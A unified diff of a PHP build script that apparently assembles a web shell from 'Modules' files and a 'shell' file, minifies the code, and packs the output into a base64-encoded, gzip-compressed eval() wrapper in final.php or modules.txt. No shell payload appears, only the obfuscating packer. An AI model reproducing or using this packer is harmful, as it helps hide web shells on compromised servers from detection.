@@ -12,11 +12,11 @@ if( ! isset( $argv[1] ) || ( isset( $argv[1] ) && ( $argv[1] === 'lite' ) ) )
 
 	if( ! isset( $argv[1] ) )
 	{
-		$oDirectory = new DirectoryIterator( 'Modules' );
+		$oDirectory = new DirectoryIterator( __DIR__ . '/Modules' );
 
 		foreach( $oDirectory as $oFile )
 		{
-			if( is_file( $sFile = $oFile -> getPathname() ) )
+			if( is_file( $sFile = $oFile -> getPathname() ) && ( $oFile -> getFilename() !== 'Dummy.php' ) )
 			{
 				$aFiles[] = 'Modules/' . basename( $sFile, '.php' );
 			}
@@ -24,7 +24,7 @@ if( ! isset( $argv[1] ) || ( isset( $argv[1] ) && ( $argv[1] === 'lite' ) ) )
 	}
 	else
 	{
-		$aFiles[] = 'Modules/Ls';
+		//$aFiles[] = 'Modules/Eval';
 	}
 
 	$aFiles[] = 'shell';
@@ -37,8 +37,6 @@ if( ! isset( $argv[1] ) || ( isset( $argv[1] ) && ( $argv[1] === 'lite' ) ) )
 	}
 
 	$sData = preg_replace( '~^require_once.+?[\r\n]+~m', NULL, $sData ) . "?>";
-
-	file_put_contents( __DIR__ . '/Tmp/dev.php', $sData );
 }
 else if( isset( $argv[1] ) && ( $argv[1] === 'modules' ) )
 {
@@ -47,14 +45,14 @@ else if( isset( $argv[1] ) && ( $argv[1] === 'modules' ) )
 
 	foreach( $oDirectory as $oFile )
 	{
-		if( is_file( $sFile = $oFile -> getPathname() ) )
+		if( is_file( $sFile = $oFile -> getPathname() ) && ( $oFile -> getFilename() !== 'Dummy.php' ) )
 		{
 			$sData .= file_get_contents( $sFile, NULL, NULL, 6 );
 		}
 	}
 }
 
-
+file_put_contents( __DIR__ . '/Tmp/dev.php', $sData );
 
 /**
  * Wyrazenie " ! " -> "!"
@@ -182,15 +180,16 @@ $sData = preg_replace( '~}\n?~', '}', $sData );
 
 $sData = preg_replace( '~(?<!\nDATA);\n(<!DATA;)~', ';', $sData );
 
-if( isset( $argv[1] ) && $argv[1] === 'modules' )
+if( substr( $sData, -2 ) !== '?>' )
 {
-	file_put_contents( __DIR__ . '/Tmp/modules.txt', $sData . "\r\n?>" );
-	exit ;
+	$sData .= '?>';
 }
-else
+
+if( isset( $argv[1] ) && ( $argv[1] !== 'modules' ) )
 {
 	file_put_contents( __DIR__ . '/Tmp/prod.php', $sData );
 }
+
 
 $sData = '?>' . $sData . '<?';
 
@@ -199,4 +198,7 @@ for( $i = 0; $i < 1; $i++ )
 	$sData = sprintf( "eval(gzuncompress(base64_decode('%s')));", base64_encode( gzcompress( $sData, 9 ) ) );
 }
 
-file_put_contents( __DIR__ . '/Tmp/final.php', sprintf( "<?php eval(gzuncompress(base64_decode('%s')));?>", base64_encode( gzcompress( $sData, 9 ) ) ) );
+
+$sFile = __DIR__ . '/Tmp/' . ( ( isset( $argv[1] ) && ( $argv[1] === 'modules' ) ) ? 'modules.txt' : 'final.php'  );
+
+file_put_contents( $sFile, sprintf( "<?php eval(gzuncompress(base64_decode('%s')));?>", base64_encode( gzcompress( $sData, 9 ) ) ) );
